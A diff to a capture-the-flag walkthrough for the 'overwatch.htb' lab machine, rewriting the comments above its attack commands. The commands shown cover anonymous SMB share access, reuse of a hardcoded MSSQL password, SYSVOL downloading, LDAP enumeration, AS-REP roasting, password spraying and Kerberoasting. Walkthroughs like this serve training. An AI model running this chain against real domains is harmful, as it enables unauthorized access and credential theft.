@@ -76,16 +76,16 @@ nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,4966
 ### SMB Enumeration
 
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: perform a broad SMB share enumeration with null and guest accounts.
+# Why here: check for unauthenticated access to system shares or public deployment directories.
 netexec smb overwatch.htb -u '' -p '' --shares
 netexec smb TARGET_IP -u 'guest' -p '' --shares
 ```
 **Result:** `STATUS_ACCESS_DENIED` — Null sessions and guest access blocked.
 
 ```bash
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: connect to the software$ share anonymously.
+# Why here: search for installer binaries, source code, or configuration files that might contain hardcoded secrets.
 smbclient //TARGET_IP/software$ -N
 ```
 **Result:** ✅ Anonymous access to `software$` share granted.
@@ -109,8 +109,8 @@ Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
 ### MSSQL Access Verification
 
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: validate the captured sqlsvc credentials against the MSSQL instance.
+# Why here: confirm the hardcoded password found in the binary is valid for remote database access.
 netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
 ```
 ```
@@ -125,8 +125,8 @@ netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
 ### Privilege Check
 
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: check if the sqlsvc account has sysadmin privileges.
+# Why here: determine if the database service account has full server control or if vertical escalation is required.
 netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
   -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
 ```
@@ -135,8 +135,8 @@ netexec mssql TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
 ### Interactive Session
 
 ```bash
-# What it does: executes an Impacket utility for AD/Windows.
-# Why here: extract tickets, hashes or protocol access for the chain.
+# What it does: establish an interactive session with the MSSQL server.
+# Why here: perform internal database enumeration and execute T-SQL commands for linked server discovery.
 impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@TARGET_IP -port 6520 -windows-auth
 ```
 
@@ -160,23 +160,23 @@ enum_owner
 
 **SYSVOL Access:**
 ```bash
-# What it does: connects to an SMB resource and optionally executes an action.
-# Why here: listar, descargar o subir archivos por SMB.
+# What it does: recursively download the contents of the SYSVOL share using captured credentials.
+# Why here: search for Group Policy Preferences (GPP), scripts, or configuration files containing domain secrets.
 smbclient //TARGET_IP/SYSVOL -U overwatch.htb/sqlsvc%'TI0LKcfHzZw1Vv' \
   -c "recurse ON; prompt OFF; cd overwatch.htb; mget *" 2>/dev/null
 ```
 
 **LDAP User Enumeration:**
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: perform LDAP user enumeration using authenticated bind.
+# Why here: obtain a complete list of domain users for later password spraying attacks.
 netexec ldap TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users 2>/dev/null
 ```
 
 **AS-REP Roasting:**
 ```bash
-# What it does: executes an Impacket utility for AD/Windows.
-# Why here: extract tickets, hashes or protocol access for the chain.
+# What it does: perform an AS-REP Roasting attack against the domain.
+# Why here: check for accounts with 'Do not require Kerberos preauthentication' set to crack their hashes offline.
 impacket-GetNPUsers overwatch.htb/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -format hashcat
 ```
 **Result:** No AS-REP roastable accounts found.
@@ -364,22 +364,22 @@ hashcat -m 5600 <captured_hash> /usr/share/wordlists/rockyou.txt --force
 
 ### Password Policy Check
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: retrieve the domain password policy via SMB.
+# Why here: identify lockout thresholds and complexity requirements to inform a safe password spraying strategy.
 netexec smb TARGET_IP -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol
 ```
 
 ### SMB Spraying (Fast)
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: perform a password spraying attack using the sqlsvc password.
+# Why here: check for other domain accounts that reuse the same hardcoded password found earlier.
 netexec smb TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
 ```
 
 ### LDAP Spraying (Stealth)
 ```bash
-# What it does: enumerates or authenticates against Windows/AD services.
-# Why here: validar acceso, shares, usuarios o politicas.
+# What it does: validate credentials against LDAP during the password spray.
+# Why here: confirm domain account validity and potentially discover accounts with broader LDAP search privileges.
 netexec ldap TARGET_IP -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
 ```
 
@@ -390,8 +390,8 @@ kerbrute passwordspray -d overwatch.htb --dc TARGET_IP users.txt 'TI0LKcfHzZw1Vv
 
 ### Kerberoasting
 ```bash
-# What it does: executes an Impacket utility for AD/Windows.
-# Why here: extract tickets, hashes or protocol access for the chain.
+# What it does: request Service Principal Name (SPN) tickets for domain user accounts.
+# Why here: perform a Kerberoasting attack to capture TGS tickets for offline cracking of service account passwords.
 impacket-GetUserSPNs overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv' -dc-ip TARGET_IP -request
 ```
 
